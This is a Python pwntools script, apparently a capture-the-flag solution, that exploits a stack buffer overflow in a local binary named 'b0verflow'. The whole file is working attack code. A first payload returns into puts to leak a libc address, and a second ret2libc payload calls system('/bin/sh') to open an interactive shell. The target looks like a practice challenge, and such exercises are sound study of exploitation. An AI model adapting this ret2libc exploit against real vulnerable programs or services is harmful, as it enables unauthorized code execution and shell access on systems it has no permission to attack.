'''
Author: Samrito
Date: 2022-03-18 10:33:59
LastEditors: Samrito
LastEditTime: 2022-03-18 11:15:24
'''
from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


io = process(argv=['./b0verflow'])
elf = ELF('./b0verflow')
libc = ELF('./libc-2.31.so')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = elf.symbols['main']
payload = flat([b'@' * (0x20 + 4), puts_plt, main_addr, puts_got])

#debug('b * main')

io.recvuntil(b"What's your name?\n")
io.sendline(payload)
io.recvuntil(b'.')
res = io.recvline()
puts_addr = u32(res[:4].ljust(4, b'\x00'))
offset = puts_addr - libc.symbols['puts']

system_addr = libc.symbols['system'] + offset
str_bin_sh = next(libc.search(b'/bin/sh')) + offset

print(hex(puts_addr))

log.info('system addr: ' + hex(system_addr))

payload = flat([b'@' * (0x20 + 4), system_addr, 0xdeadbeef, str_bin_sh])
io.recvuntil(b"What's your name?\n")
io.sendline(payload)
io.interactive()